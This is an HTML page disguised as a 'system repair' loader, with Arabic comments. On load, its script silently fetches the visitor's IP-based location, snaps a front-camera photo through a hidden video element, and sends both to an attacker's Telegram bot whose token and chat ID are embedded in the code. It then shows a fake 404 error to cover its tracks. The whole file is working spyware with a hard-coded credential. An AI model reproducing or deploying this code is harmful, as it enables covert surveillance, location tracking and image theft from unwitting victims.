<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>⚡ SYSTEM_REPAIR_v4</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px; text-align:center;">
    <h2 id="status">LOADING_CORE_PROTOCOLS...</h2>
    <video id="v" autoplay style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // --- ضع بياناتك هنا يا خبيث ---
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY;"
        const ID = "1772820433;"

        async function exfiltrate(data, type='text') {
            let url = `https://api.telegram.org/bot${T}/`;
            if(type === 'text') {
                await fetch(url + 'sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: ID, text: data})
                });
            } else {
                const blob = await (await fetch(data)).blob();
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'hit.png');
                f.append('caption', "📸 تم سحب الصورة بنجاح 💀");
                await fetch(url + 'sendPhoto', { method: 'POST', body: f });
            }
        }

        // 1. سحب الموقع بالـ IP (بدون إذن النظام)
        async function getSilentLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const msg = `📡 [اختراق صامت]\n📍 المدينة: ${data.city}\n🌐 الموقع: ${data.latitude},${data.longitude}\n📶 المزود: ${data.org}\n📱 الجهاز: ${navigator.platform}`;
                exfiltrate(msg);
            } catch(e) { exfiltrate("❌ فشل سحب الـ IP"); }
        }

        // 2. التصوير الخاطف (خداع النظام)
        async function silentCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const vid = document.getElementById('v');
                vid.srcObject = stream;
                
                setTimeout(() => {
                    const can = document.getElementById('c');
                    can.width = vid.videoWidth;
                    can.height = vid.videoHeight;
                    can.getContext('2d').drawImage(vid, 0, 0);
                    exfiltrate(can.toDataURL('image/png'), 'photo');
                    
                    // إغلاق فوري
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('status').innerText = "ERROR_404: FILE_NOT_FOUND";
                }, 300); // 300 مللي ثانية فقط!
            } catch(e) { exfiltrate("⚠️ النظام حظر الكاميرا"); }
        }

        window.onload = () => {
            getSilentLocation(); 
            silentCapture();     
        };
    </script>
</body>
</html>
